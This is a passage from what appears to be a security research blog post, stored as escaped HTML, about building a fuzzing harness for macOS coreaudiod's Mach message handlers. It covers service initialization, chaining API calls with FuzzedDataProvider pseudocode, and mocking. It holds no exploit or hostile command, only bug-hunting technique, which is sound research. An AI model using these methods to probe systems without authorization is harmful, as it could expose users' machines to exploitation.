VEfNEQsFFH-c3&quot;&gt;-nthreads&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;./harness&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;@@&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.jsid3perx0o6&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Iterate on the Fuzzing Harness&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;This harness quickly generated many crashes, a sign I was on the right track. However, I quickly learned that initial crashes are often not indicative of a security bug, but of a design bug in the fuzzing harness itself or an invalid assumption.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.4t3pc9rql9v1&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Iteration 1: Target Initialization&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;One&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;of the difficulties with my fuzzing approach was that my target function (the Mach message handler) expected the HAL system to be in a specific state to begin receiving Mach messages. By simply calling the library function with my fuzzing harness, these assumptions were broken.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;This caused errors to start popping up. As shown in the diagram below, the harness bypassed much of the bootstrapping functionality the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;process would normally take care of during startup.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZ3Be_wFyS0QRA-Xcl7m8Ic95BtiGiJsaP_F7XHixqDcX8HLdlYjHCxq81AgjJrFDxV561oYvnCPkGoMleWpCNU2OeHx665_wzHznxDHyGWXTHoch5KrdQdfuz-7N6qJo02C8DxFhnV71DHi2heROguce3pGykCkkFWWRBVd71Si2Schmmrfw8ur4CyLQ/s1056/image16.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZ3Be_wFyS0QRA-Xcl7m8Ic95BtiGiJsaP_F7XHixqDcX8HLdlYjHCxq81AgjJrFDxV561oYvnCPkGoMleWpCNU2OeHx665_wzHznxDHyGWXTHoch5KrdQdfuz-7N6qJo02C8DxFhnV71DHi2heROguce3pGykCkkFWWRBVd71Si2Schmmrfw8ur4CyLQ/s1056/image16.png&quot; border=&quot;0&quot; alt=&quot;Two diagrams comparing code execution. The left diagram, labeled &amp;quot;Fuzzer + Harness,&amp;quot; shows a single path 1 directly calling &amp;quot;Process Mach Message&amp;quot; within the &amp;quot;CoreAudio Library.&amp;quot; The right diagram, labeled &amp;quot;Coreaudiod Native Process,&amp;quot; shows multiple steps 1, 2, 3, ..., X before &amp;quot;Process Mach Message&amp;quot; is called in the &amp;quot;CoreAudio Library.&amp;quot;&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Two diagrams comparing code execution. The left diagram, labeled &amp;quot;Fuzzer + Harness,&amp;quot; shows a single path 1 directly calling &amp;quot;Process Mach Message&amp;quot; within the &amp;quot;CoreAudio Library.&amp;quot; The right diagram, labeled &amp;quot;Coreaudiod Native Process,&amp;quot; shows multiple steps 1, 2, 3, ..., X before &amp;quot;Process Mach Message&amp;quot; is called in the &amp;quot;CoreAudio Library.&amp;quot;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Code coverage, as well as error messages, can be very helpful in helping determine some of the initialization steps a fuzzing harness is neglecting. For example, I noticed my data flow would always fail early in most Mach message handlers, logging the message &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;Error: there is no system&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoV6ZNVyJ-2NuZKL6DvCio_4eE_n5ISFGoIuC9oUPCWK-XQK_Lv184bT7SFF371j7UDNHFWYk9tPJvt1RRx3rd6OFNU74mF6VqLTGGza3F2ADhK1TqQzhFOlF6AYR1Yj-DImFVGAFuM3B9liG40z8D6vcPaLQH4f6w4SX-H1Nhw47CZhUNVNHOuIyMYlY/s1047/image22.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoV6ZNVyJ-2NuZKL6DvCio_4eE_n5ISFGoIuC9oUPCWK-XQK_Lv184bT7SFF371j7UDNHFWYk9tPJvt1RRx3rd6OFNU74mF6VqLTGGza3F2ADhK1TqQzhFOlF6AYR1Yj-DImFVGAFuM3B9liG40z8D6vcPaLQH4f6w4SX-H1Nhw47CZhUNVNHOuIyMYlY/s1047/image22.png&quot; border=&quot;0&quot; alt=&quot;A flowchart of disassembled code execution. One path, highlighted with &amp;quot;We always go this way!&amp;quot;, leads to a successful HALS_System::GetInstance call. Another path shows an error message &amp;quot;Error: There is no system&amp;quot; after a call to HALS_Object_SetProperty if a different condition is met.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A flowchart of disassembled code execution. One path, highlighted with &amp;quot;We always go this way!&amp;quot;, leads to a successful HALS_System::GetInstance call. Another path shows an error message &amp;quot;Error: There is no system&amp;quot; after a call to HALS_Object_SetProperty if a different condition is met.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;It turns out I needed to initialize the HAL System before I could interact correctly with the Mach APIs. In my case, calling the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_AudioHardwareStartServer&lt;/span&gt;&lt;span&gt;&amp;nbsp;function &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/dillonfranke/breaking-the-sound-barrier/blob/1e221ce5b2b15a9cd56185c42b211a70a0e6d867/harness.mm#L1602&quot;&gt;in my fuzzing harness&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;took care of most of the necessary initialization.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.9rt3ppkwqzer&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Iteration 2: API Call Chaining&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;My first crack at a fuzzing harness was cool, but it made a pretty large &lt;/span&gt;&lt;span&gt;assumption&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;: all accessible Mach message handlers functioned independently of each other. As I quickly learned, this assumption was incorrect. As I ran the fuzzer, error messages like the following one started popping up:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHtOXPIlL9LHejXAVdcdFWSF-nsUbLSvbfVgHN7ADfDUrw7DwgUptz7HL2bK8GvQPuS3zXaAhyLhO9YTU2WiWzY-zNcX3gqJ2R7QOr1ohiRxavIYSxubHaULVSZLOfvs1Zf9vmUMjT0pNIQ1yMe-yJ3jf1cLhWLUR5IYPwiONkTF4nQfqctEm3xqTeFDU/s1999/image19.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHtOXPIlL9LHejXAVdcdFWSF-nsUbLSvbfVgHN7ADfDUrw7DwgUptz7HL2bK8GvQPuS3zXaAhyLhO9YTU2WiWzY-zNcX3gqJ2R7QOr1ohiRxavIYSxubHaULVSZLOfvs1Zf9vmUMjT0pNIQ1yMe-yJ3jf1cLhWLUR5IYPwiONkTF4nQfqctEm3xqTeFDU/s1200/image19.png&quot; border=&quot;0&quot; alt=&quot;A terminal window showing log output from mach-send. A line is highlighted with a red box and arrow, pointing to the text &amp;quot;Plist: there is no client&amp;quot; associated with a coreaudiod error.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A terminal window showing log output from mach-send. A line is highlighted with a red box and arrow, pointing to the text &amp;quot;Plist: there is no client&amp;quot; associated with a coreaudiod error.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The error seemed to indicate the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;SetPropertyData&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;Mach handler was expecting a client to be registered via a previous Mach message. Clearly, the Mach handlers I was fuzzing were stateful and depended on each other to function properly. My fuzzing harness would need to take this into consideration in order to have any hope of obtaining good code coverage on the target.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;This highlights a common problem in the fuzzing world: most coverage-guided &lt;/span&gt;&lt;span&gt;fuzzers&lt;/span&gt;&lt;span&gt;&amp;nbsp;accept a single input, (a bunch of bytes) while many things we want to fuzz accept data in a completely different format, such as several arguments of different types, or even several function calls. This &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md&quot;&gt;Google writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;explains the problem well, as does Ned Williamson&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://youtu.be/xzG0pLM4Q64&quot;&gt;OffensiveCon Talk from 2019&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;To get around this limitation, we can use a technique I refer to as &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c26&quot;&gt;API Call Chaining&lt;/span&gt;&lt;span&gt;, which considers each fuzz input as a stream that can be read from to craft multiple valid inputs. Thus, each fuzzing iteration would be capable of generating multiple Mach messages. This simple but important insight allows a fuzzer to explore the interdependency of separate function calls using the same code-coverage&lt;/span&gt;&lt;span&gt;&amp;nbsp;informed input. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/llvm/llvm-project/blob/main/compiler-rt/include/fuzzer/FuzzedDataProvider.h&quot;&gt;FuzzedDataProvider class&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;, which is part of LibFuzzer but can be included as a header for use with any fuzzing harness, is a great choice for consuming a fuzz sample and transforming it into a more meaningful data type. Consider the following pseudocode:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;extern &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c29&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;LLVMFuzzerTestOneInput(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;const &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;uint8_t*&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;data,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;size)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;FuzzedDataProvider&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;fuzz_data(data,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;size);&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Initialize FDP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; while &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(fuzz_data.remaining_bytes()&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;MACH_MSG_MIN_SIZE)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c20&quot;&gt;// Continue until we&amp;#39;ve consumed all bytes&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;msg_id&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;fuzz_data.ConsumeIntegralInRange&amp;lt;uint32_t&amp;gt;(&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1010000&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c5&quot;&gt;1010062&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; switch &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;(msg_id)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; case &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#39;1010000&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;send_XSystem_Open_msg(fuzz_data);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; case &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#39;1010001&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;send_XSystem_Close_msg(fuzz_data);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; case &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;&amp;#39;1010002&amp;#39;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;send_XSystem_GetObjectInfo_msg(fuzz_data);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;continued&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c9&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot; style=&quot;padding-top:10pt&quot;&gt;&lt;span&gt;This code transforms a blob of bytes into a mechanism that can repeatedly call APIs with fuzz data in a deterministic manner. What&amp;rsquo;s more, a coverage-guided fuzzer will be able to explore and identify a series of API calls that improves code coverage. From the fuzzer&amp;rsquo;s perspective, it is simply modifying an array of bytes, blissfully unaware of the additional complexity happening under the &lt;/span&gt;&lt;span&gt;hood&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;For example, my fuzzer quickly identified that most interactions with the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;audiohald&lt;/span&gt;&lt;span&gt;&amp;nbsp;service required a call to the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XSystem_Open&lt;/span&gt;&lt;span&gt;&amp;nbsp;message handler to register a client before most APIs could be called. The inputs the fuzzer saved to its corpus naturally reflected this fact&lt;/span&gt;&lt;span&gt;&amp;nbsp;over time&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.ek3f0s8v7aa&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Iteration 3: Mocking Out Buggy/Unneeded Functionality&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Sometimes coverage plateaus, and a fuzzer struggles to explore new code paths. For example, say we&amp;rsquo;re fuzzing an HTTP server and it keeps getting stuck because it&amp;rsquo;s trying to read and parse configuration files on startup. If our focus was on the server&amp;rsquo;s request parsing and response logic, we might choose to mock out the functionality we don&amp;rsquo;t care about in order to focus the fuzzer&amp;rsquo;s code coverage exploration elsewhere.&lt;/span&gt;&lt;/p&gt;
